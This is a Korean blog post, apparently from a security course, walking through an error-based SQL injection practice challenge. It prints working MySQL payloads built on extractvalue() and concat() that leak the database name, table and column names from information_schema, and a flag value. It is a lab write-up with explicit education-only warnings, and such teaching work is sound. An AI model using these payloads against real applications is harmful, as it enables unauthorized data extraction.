---
layout: single
title:  "7 주차 SQL injection 데이터 추출 문제 풀이(1)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 7 주차 SQL injection 데이터 추출 문제 풀이(1)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1 개요 </span>

<br>

SQL injection 데이터 추출 방식에는 3 가지 방식이 있습니다.

<br>

<span style='font-weight:bold; font-size:15px'>1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) => UNION SQLi (로그인 or 게시판 등)</span>

<span style='font-weight:bold; font-size:15px'>2. 에러 메세지가 화면에 출력 되는 경우(데이터추출(3)) => Error Based SQLi (에러 메세지 확인 가능 한 곳)</span>

<span style='font-weight:bold; font-size:15px'>3. 참과 거짓으로 출력 되는 경우(데이터추출(4)) => Blind SQLi (로그인 or 아이디 중복 체크 등)</span>

<br>

## <span style="background:#696969; color:#ffffff">1.2  Error Based SQLi </span>

<br>

🖥SQL injection 데이터 추출(3)과 추출된 값을 제외하고,  문제 풀이 과정은 같습니다.🖥

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.1 sql injection 포인트 찾기</span>

***

<br>

<img src="/images/2024-06-05-SQLinjection18/image-20240605035953092.png" alt="image-20240605035953092" style="zoom:50%;" />

기본적으로 Error Based SQLi를 적용하려면 SQL 에러를 화면에 출력 되어야 하므로,

<img src="/images/2024-06-05-SQLinjection18/image-20240601094626149.png" alt="image-20240601094626149" style="zoom:50%;" />

SQL에러 와 관련된 에러가 발생하는지 확인한다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2  에러 출력 함수</span>

***

<br>

(대표적)**`EXTRACTVALUE()`**
or **`CAST()`**와**`CONVERT()`** 등을 이용.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.3 공격 format 만들기</span>

***

<br>

' and extractvalue('1',concat(0x3a,(select 'test'))) and '1'='1

<img src="/images/2024-06-05-SQLinjection18/image-20240601100910338.png" alt="image-20240601100910338" style="zoom:67%;" />

문법 에러가 나타나지 않으면서, 로직 에러가 나타나는 것 까지 확인 했습니다!

<br>

따라서 

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1

이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.4 DB이름 확인하기</span>

***

<br>

DB 이름 확인하는 법은   
select database() 이므로,   
<br>

공격 format   
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.   
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select database() limit 0,1</span>))) and '1'='1

![image-20240605040803125](/images/2024-06-05-SQLinjection18/image-20240605040803125.png)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.5 table이름 확인하기</span>

***

<br>

table 이름 확인하는 법은  
select table_name from information_schema.tables where table_schema='DB name' limit 0,1 이므로,   
<br>

공격 format  
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.   
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema='errSqli' limit 0,1 </span>))) and '1'='1

<img src="/images/2024-06-05-SQLinjection18/image-20240605040936100.png" alt="image-20240605040936100" style="zoom: 67%;" />[limit 0,1]

<img src="/images/2024-06-05-SQLinjection18/image-20240605041003713.png" alt="image-20240605041003713" style="zoom:67%;" />[limit 1,1]

<img src="/images/2024-06-05-SQLinjection18/image-20240605041031474.png" alt="image-20240605041031474" style="zoom:67%;" />[limit 2,1]



<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.6 column 이름 확인하기</span>

***

<br>

column 이름 확인하는 법은  
select column_name from information_schema.columns where table_name='table name' limit 0,1 이므로,   
<br>

공격 format  
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.  
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name='flagTable' limit 0,1</span>))) and '1'='1

<img src="/images/2024-06-05-SQLinjection18/image-20240605041220019.png" alt="image-20240605041220019" style="zoom:67%;" />[limit 0,1]

<img src="/images/2024-06-05-SQLinjection18/image-20240605041243910.png" alt="image-20240605041243910" style="zoom:67%;" />[limit 1,1]	



이런 식으로 컬럼을 알 수 있다.

<br>



#### <span style="background:#A9A9A9; color:#ffffff">1.2.7 data 추출하기</span>

***

<br>

다음과 같이 data를 추출 한다.

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select flag from flagTable limit 0,1</span>))) and '1'='1

<img src="/images/2024-06-05-SQLinjection18/image-20240605041502469.png" alt="image-20240605041502469" style="zoom:67%;" />

Flag 값이 나왔습니다!!

